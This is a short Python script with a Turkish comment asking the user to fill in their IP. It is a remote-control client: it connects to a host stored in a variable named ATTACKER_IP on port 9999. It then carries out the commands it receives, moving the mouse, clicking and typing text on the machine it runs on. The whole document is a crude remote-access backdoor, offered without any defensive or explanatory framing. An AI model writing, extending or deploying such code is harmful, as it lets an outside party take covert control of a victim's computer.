import socket
import mouse
import keyboard

# Senin IP adresini buraya yaz
ATTACKER_IP = "192.168.1.X" 

s = socket.socket()
s.connect((ATTACKER_IP, 9999))

while True:
    cmd = s.recv(1024).decode()
    parts = cmd.split()
    
    if parts[0] == "move":
        mouse.move(int(parts[1]), int(parts[2]), absolute=True, duration=0.2)
    elif parts[0] == "click":
        mouse.click('left')
    elif parts[0] == "type":
        text = " ".join(parts[1:])
        keyboard.write(text)